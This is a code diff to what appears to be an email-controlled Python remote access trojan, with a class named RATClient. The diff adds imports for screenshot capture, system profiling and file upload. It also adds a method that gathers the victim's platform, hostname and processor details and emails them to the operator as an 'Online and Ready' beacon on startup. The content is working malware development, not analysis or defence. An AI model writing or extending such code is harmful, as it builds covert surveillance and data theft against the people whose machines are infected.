@@ -8,6 +8,7 @@ import email
 import threading
 import requests
 import tempfile
+import platform
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -15,7 +16,22 @@ from email.header import decode_header
 
 # Externals
 from externals.templates import create_html_content, shell
-from externals.useless import basic_systeminfo
+
+# Imports for modules
+import mss #Screenshot
+import datetime #For Screenshot
+import io #For Screenshot
+from mss.tools import to_png #For Screenshot
+
+import socket #For Systeminfo
+import uuid #For Systeminfo
+import cpuinfo #For Systeminfo
+import psutil #For Systeminfo
+
+# import requests# For File Upload
+import os.path# For File Upload
+# import os# For File Upload
+
 
 class EmailHandler:
     def __init__(self, username, password, your_mail):
@@ -183,9 +199,21 @@ class RATClient:
         self.command_handler = CommandHandler(self.email_handler)
         self.idle_interval = idle_interval
         self.command_interval = 1
+    
+    def basic_systeminfo(self):
+        info = f"""Online🟢  and Ready
+Platform: {platform.platform()}
+Python Version: {platform.python_version()}
+Machine: {platform.machine()}
+Processor: {platform.processor()}
+Hostname: {platform.node()}
+System: {platform.system()}
+
+"""
+        return info
 
     def start(self):
-        welcome_msg = create_html_content(basic_systeminfo())
+        welcome_msg = create_html_content(self.basic_systeminfo())
         self.email_handler.send_email(welcome_msg)
         last_active = time.time()
         idle = False
